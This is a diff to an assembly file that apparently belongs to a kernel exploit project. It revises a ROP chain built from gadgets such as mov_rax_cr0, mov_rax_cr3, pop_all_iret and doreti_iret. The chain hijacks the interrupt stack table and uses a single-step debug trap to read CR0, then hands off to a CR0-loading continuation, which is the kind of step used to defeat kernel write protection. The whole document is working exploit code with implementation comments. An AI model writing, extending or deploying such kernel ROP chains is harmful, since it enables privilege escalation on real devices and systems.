@@ -9,6 +9,7 @@ extern justreturn_pop
 extern wrmsr_ret
 extern pcpu
 extern mov_rax_cr3
+extern mov_rax_cr0
 extern mov_cr3_rax_mov_ds
 extern nop_ret
 extern pop_all_iret
@@ -566,22 +567,57 @@ dq 0
 ; output remains in the same compact result block.  UELF poisons and copies
 ; this whole block at once so stale state cannot pass validation.
 times fpu_cr0_scratch_offset-($-regs_for_exit) db 0
-times 0x68 db 0
+times 0x28 db 0
+
+; Place the one-shot #DB register stash so its RAX slot aliases the capture
+; helper's saved-CR0 slot at scratch+0x58.  This avoids a separate KELF memcpy;
+; the remaining saved registers land only in result padding and reserved space.
+fpu_cr0_regs_stash_after_read_cr0:
+times iret_rip db 0
+dq nop_ret
+dq 0x20
+dq 2
+dq fpu_cr0_after_read_cr0
+dq 0
 
 ; Fast CR0 enter service.  UELF redirects the post-CR3 continuation here for
-; exactly one yield.  Reset the hook first, then enter the same validated
-; save/clear continuation used by the generic run_gadget fallback.
+; exactly one yield.  Reset that hook, single-step only MOV RAX,CR0, save its
+; result, then enter the same validated clear/write continuation used by the
+; generic cr0_capture fallback.  The dedicated #DB continuation avoids a
+; second KELF -> UELF -> KELF round trip.
 times fpu_cr0_fast_enter_stack_offset-($-regs_for_exit) db 0
 fpu_cr0_fast_enter_stack:
 pokeq ist_after_restore_cr3_rsp, return_to_caller
+pokeq ist_noerrc, .ist_after_read_cr0
+dq doreti_iret
+dq mov_rax_cr0
+dq 0x20
+dq 0x102
+dq 0
+dq 0
+
+align 16
+dq 0
+.iret_frame_after_read_cr0:
+times 5 dq 0
+.ist_after_read_cr0:
+times iret_rip-(.ist_after_read_cr0-.iret_frame_after_read_cr0) db 0
+dq push_pop_all_iret
+dq 0x20
+dq 2
+dq fpu_cr0_regs_stash_after_read_cr0+iret_rip
+dq 0
+
+fpu_cr0_after_read_cr0:
+pokeq ist_noerrc, noerrc_iret_frame+40
 dq pop_all_iret
 times iret_rdi db 0
 dq regs_for_exit+fpu_cr0_scratch_offset
 times iret_rsi-iret_rdi-8 db 0
 dq regs_for_exit+fpu_cr0_cleared_offset
 times iret_rip-iret_rsi-8 db 0
-dq cr0_capture
+dq cr0_load
 dq 0x20
 dq 2
-dq regs_for_exit+fpu_cr0_enter_stack_offset
+dq regs_for_exit+fpu_cr0_enter_stack_offset+8
 dq 0
